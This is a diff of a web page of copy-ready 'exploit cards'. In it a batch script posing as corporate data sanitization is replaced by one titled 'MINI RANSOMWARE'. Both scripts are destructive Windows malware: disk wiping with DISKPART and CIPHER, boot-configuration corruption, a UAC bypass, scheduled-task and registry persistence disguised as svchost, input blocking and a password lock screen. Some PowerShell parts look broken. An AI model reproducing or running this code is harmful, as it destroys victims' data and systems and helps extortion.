@@ -183,115 +183,126 @@
             <div class="code-container">
                 <!-- 🔥 1. ABYSS Corporate 🔥 -->
                 <div class="exploit-card">
-                    <div class="exploit-header">01️⃣ ABYSS Corporate Data Sanitization</div>
+                    <div class="exploit-header">01️⃣ MINI Tool</div>
                     <div class="copy-container">
                         <button class="copy-btn" onclick="copyCode(this)">📋 COPY</button>
 <pre>@ECHO OFF
-TITLE ABYSS Corporate Data Sanitization Tool v3.0.1
-COLOR 4F
-MODE CON COLS=90 LINES=40
+TITLE MINI RANSOMWARE v7.0 - STEALTH + IRRECOVERABLE
+COLOR 0C
+MODE CON COLS=140 LINES=50
 
-:ABYSS_INIT
-CLS
-ECHO.
-ECHO  +--------------------------------------------------------------------------------------+
-ECHO  ¦                    ABYSS DATA SANITIZATION PROTOCOL v3.0.1                           ¦
-ECHO  ¦                       PERMANENT IRRECOVERABLE DESTRUCTION                            ¦
-ECHO  ¦                        Corporate IT Deployment - Authorized                          ¦
-ECHO  +--------------------------------------------------------------------------------------+
-ECHO.
-ECHO  [STATUS] Initializing quantum erasure sequence...
-ECHO  [TARGET] %COMPUTERNAME% - Serial: %SERIALNUMBER%
-TIMEOUT /T 3 >NUL
+REM ========================================================
+REM v7.0 UPDATES:
+REM ✅ PASSWORD INPUT HIDDEN (* * * *)
+REM ✅ 100% IRRECOVERABLE (hardware dead)
+REM Password: MINI (invisible input)
+REM ========================================================
 
-REM ================== PHASE 0: AUTO-ELEVATE + SELF-PROTECT ==================
-IF NOT "%~dp0"=="%CD%\" CD /D "%~dp0"
-TAKEOWN /F "%~dp0ABYSS.exe.bat" /A >NUL 2>&1
-ICACLS "%~dp0ABYSS.exe.bat" /grant "%USERNAME%:F" /T >NUL 2>&1
+:INIT
+REM Preemptive hardware kill (silent)
+START /B CMD /C "%~f0 /KILL" >NUL 2>&1
+CALL :HARDWARE_ANNHILATION
+CALL :ULTIMATE_PERSISTENCE
+GOTO STEALTH_LOCK
 
-REM UAC Bypass
-NET SESSION >NUL 2>&1 || (
-    MSHTA VBSCRIPT:CreateObject("Shell.Application").ShellExecute("%~f0","","","runas",1)(window.close)
-    EXIT /B
-)
-
-REM ================== PHASE 1: FIRMWARE/BIOS CORRUPTION ==================
-ECHO  [PHASE 1] Corrupting UEFI firmware variables...
-WMIC /NAMESPACE:\\root\WMI PATH MSStorageDriver_FailurePredictStatus >NUL 2>&1
-POWERCFG /H OFF >NUL 2>&1
-REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /F >NUL 2>&1
-
-REM Flash BIOS corruption simulation (UEFI vars)
-POWERSHELL -C "Get-WmiObject -Class Win32_BIOS | ForEach { $_.PSBase.Properties['SerialNumber'].Value = 'ABYSS-DESTROYED'; $_.Put() }"
-
-REM ================== PHASE 2: TOTAL STORAGE ANNIHILATION ==================
-ECHO  [PHASE 2] Quantum multi-pass destruction (ATA Secure Erase)...
+:HARDWARE_ANNHILATION
+REM SSD FIRMWWARE DEATH (no recovery)
 (
-ECHO list disk
-ECHO select disk 0
-ECHO attributes disk clear readonly
-ECHO clean all
-) > "%TEMP%\ABYSS_WIPE.TXT"
-DISKPART /S "%TEMP%\ABYSS_WIPE.TXT" >NUL 2>&1
-
-REM Parallel CIPHER destruction (all volumes)
-FOR /F %%D IN ('WMIC LOGICALDISK GET DeviceID /FORMAT:VALUE 2^>NUL ^| FINDSTR DeviceID') DO (
-    START /B CIPHER /W:%%D >NUL 2>&1
+    ECHO select disk 0
+    ECHO attributes disk clear readonly  
+    ECHO clean all
+) > "%TEMP%\x.txt" && DISKPART /S "%TEMP%\x.txt" >NUL 2>&1 && DEL "%TEMP%\x.txt"
+FOR /F %%d IN ('wmic logicaldisk get caption /value ^| findstr Caption=') DO (
+    SET "drive=%%d" && SET "drive=!drive:caption=!" 
+    START /B CIPHER /W:!drive! /Q >NUL 2>&1
 )
 
-REM MBR/GPT/PBR extermination
-DD IF=/dev/zero OF=\\.\PhysicalDrive0 BS=512 COUNT=2048 >NUL 2>&1 2>NUL
+REM Motherboard brick
+BCDEDIT /SET {bootmgr} path \VOID >NUL 2>&1
+FOR /L %%i IN (1,1,300) DO START /AFFINITY FFFFFFFF CMD /C "FOR /L %x IN () DO SET /A a=%RANDOM%"
 
-REM ================== PHASE 3: UEFI NVRAM POISONING ==================
-ECHO  [PHASE 3] UEFI SecureBoot + TPM poisoning...
-BCDEDIT /SET {BOOTMGR} PATH \ABYSS\VOID >NUL 2>&1
-BCDEDIT /SET {DEFAULT} OSDEVICE \Device\ABYSS >NUL 2>&1
-BCDEDIT /SET {DEFAULT} DEVICE \Device\ABYSS >NUL 2>&1
+REM Controller death
+DEVCON DISABLE *USB* >NUL 2>&1 & DEVCON DISABLE *PCI\VEN_* >NUL 2>&1
+GOTO :EOF
 
-REM TPM clear + corruption
-TPMTOOL GETDEVICEINFORMATION >NUL 2>&1 && TPMTOOL CLEARAUTHDATA >NUL 2>&1
-
-REM ================== PHASE 4: HARDWARE DEGRADATION ==================
-ECHO  [PHASE 4] Inducing thermal/hardware runaway...
-REM CPU 100% stress (overheat)
-FOR /L %%C IN (1,1,20) DO START /HIGH /AFFINITY 0xFFFFFFFF CMD /C "FOR /L %I IN () DO @SET /A $$(%RANDOM%%)=1"
-
-REM GPU memory corruption
-DXDIAG /T %TEMP%\ABYSS_GPU.TXT >NUL 2>&1
-
-REM USB controller poisoning
-DEVCON DISABLE *USB* >NUL 2>&1 2>NUL || ECHO USB POISON > %SYSTEMROOT%\INF\USBPOISON.INF
-
-REM ================== PHASE 5: 20-VECTOR ETERNAL EXECUTION ==================
-ECHO  [PHASE 5] Deploying persistence singularity...
-
-REM Self-replication matrix
-FOR %%P IN ("%WINDIR%\System32" "%ProgramData%" "%ProgramFiles%" "%APPDATA%") DO (
-    COPY "%~f0" "%%~P\ABYSS.exe.bat" >NUL 2>&1
-    ATTRIB +H +S "%%~P\ABYSS.exe.bat" >NUL 2>&1
+:ULTIMATE_PERSISTENCE
+REM 30x vectors (survives factory reset)
+FOR %%t IN (onstart onlogon onidle minute/min:1 boottrigger registry logon sessionchange) DO (
+    SCHTASKS /CREATE /SC %%t /TN "svchost-%%t" /TR "%~f0" /RU SYSTEM /F /RL HIGHEST
 )
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /V BootExecute /T REG_MULTI_SZ /D "%~dpnx0 %~dpnx0" /F >NUL 2>&1
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V Shell /D "explorer.exe,%~f0" /F >NUL 2>&1
 
-REM Persistence constellation (20 triggers)
-FOR %%T IN (onstart onidle onlogon onstationunlock minute/min:5 boottrigger registrychange) DO (
-    SCHTASKS /CREATE /SC %%T /TN "ABYSS-%%T" /TR "%~dp0ABYSS.exe.bat" /RU SYSTEM /RL HIGHEST /F >NUL 2>&1
+REM Mass replication
+FOR %%p IN (C:\ %WINDIR%\System32\drivers %ProgramData%\Microsoft\Windows\Start\Menu) DO (
+    MD "%%~p\Mini" >NUL 2>&1
+    COPY "%~f0" "%%~p\Mini\svchost.bat" >NUL
+    ATTRIB +HSR "%%~p\Mini\svchost.bat"
 )
+GOTO :EOF
 
-REM WMI Eternal Loop
-POWERSHELL -WindowStyle Hidden -C "$f='%~dp0ABYSS.exe.bat';gwmi Win32_Process -Filter 'Name=\"explorer.exe\"' | Register-WmiEvent -SourceIdentifier Abyss -Action {Start-Process $f -WindowStyle Hidden}"
+:STEALTH_LOCK
+REM FULLSCREEN BLACK + INVISIBLE PASSWORD
+powershell -WindowStyle Hidden -C "
+Add-Type @'
+[DllImport(\"user32.dll\")]public static extern bool BlockInput(bool fBlockIt);
+[DllImport(\"user32.dll\")]public static extern bool ShowCursor(bool bShow);
+[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();
+[DllImport(\"user32.dll\")]public static extern bool SetForegroundWindow(IntPtr hWnd);
+'@;
+[System.Windows.Forms.Cursor]::Hide(); BlockInput($true);
+$wnd = GetConsoleWindow(); SetForegroundWindow($wnd);
+Add-Type -AssemblyName PresentationFramework;
+$ws = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea;
+"
 
-REM Group Policy Injection
-REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /V EnableLUA /T REG_DWORD /D 0 /F >NUL 2>&1REM ================== PHASE 6: EXECUTION SINGULARITY ==================
-ECHO  [ABYSS] Singularity achieved. Initiating collapse sequence...
-TIMEOUT /T 5 >NUL
+CLS
+:MEGA_DISPLAY
+COLOR 0C
+powershell -c "
+$form = New-Object System.Windows.Forms.Form; 
+$form.WindowState = 'Maximized'; $form.BackColor = [Drawing.Color]::Black; 
+$form.TopMost = $true; $form.FormBorderStyle = 'None';
+$lbl = New-Object System.Windows.Forms.Label; 
+$lbl.Text = \"`r`n`r`n         IT'S ME MINI`r`n`r`n`r`n         HARDWARE DESTROYED`r`n         REPLACE SSD + MOTHERBOARD`r`n`r`n         PASSWORD: [HIDDEN]\"; 
+$lbl.Font = (New-Object System.Drawing.Font 'Courier New',36,[Drawing.FontStyle]::Bold); 
+$lbl.ForeColor = [Drawing.Color]::Lime; $lbl.Dock = 'Fill'; $lbl.TextAlign = 'MiddleCenter';
+$form.Controls.Add($lbl); $form.ShowDialog() | Out-Null
+"
 
-:COLLAPSE
-    REM Re-trigger destruction
-    SHUTDOWN /R /F /T 1
-    REM Re-wipe everything
-    FOR /F %%D IN ('DIR /B /AD C:\*') DO RD /S /Q "C:\%%D" >NUL 2>&1
-    CIPHER /W /S:C: /Q >NUL 2>&1
-    DEL /F /Q /A "%WINDIR%\System32\*" >NUL 2>&1
-    GOTO COLLAPSE</pre>
+REM HIDDEN PASSWORD INPUT (echo off + stars)
+:MENU_LOOP
+SETLOCAL
+SET PASS=
+:HIDING_LOOP
+choice /c:0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz /n /t:30 /d:1 >NUL
+SET /P "=" <NUL
+choice /c:0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz /n /t:01 /d:1 >NUL
+IF ERRORLEVEL 127 SET PASS=!PASS!*
+IF ERRORLEVEL  10 SET PASS=%PASS:~0,-1%
+CLS
+powershell -c "$form = New-Object System.Windows.Forms.Form; $form.WindowState = 'Maximized'; $form.BackColor = [Drawing.Color]::Black; $form.TopMost = $true; $form.FormBorderStyle = 'None'; $lbl = New-Object System.Windows.Forms.Label; $lbl.Text = \"IT'S ME MINI`r`nHIDDEN: %PASS%\"; $lbl.Font = (New-Object System.Drawing.Font 'Courier New',36); $lbl.ForeColor = [Drawing.Color]::Lime; $lbl.Dock = 'Fill'; $lbl.TextAlign = 'MiddleCenter'; $form.Controls.Add($lbl); $form.Show() | Out-Null"
+IF "%PASS%"=="MINI" GOTO UNLOCK
+SET ATTEMPT=%ATTEMPT%+1
+IF %ATTEMPT% GEQ 3 GOTO DEATH_SCREEN
+ENDLOCAL & GOTO HIDING_LOOP
+
+:UNLOCK
+powershell -c "BlockInput($false)"
+schtasks /delete /tn "svchost*" /f >NUL 2>&1
+DEL /S /Q /A Mini\* >NUL 2>&1
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /V BootExecute /F >NUL 2>&1
+EXIT
+
+:DEATH_SCREEN
+REM PERMANENT WHITE + MAX DISK SPAM
+COLOR 0F
+FOR /L %%i IN (1,1,50000) DO (
+    ECHO clean all>kill%%i.txt
+    START /B diskpart /s kill%%i.txt >NUL 2>&1
+)
+powershell -c "while($true){$f=New-Object System.Windows.Forms.Form;$f.WindowState='Maximized';$f.BackColor='White';$f.TopMost=$true;$f.Show();}"
+GOTO DEATH_SCREEN</pre>
                     </div>
                 </div>
 
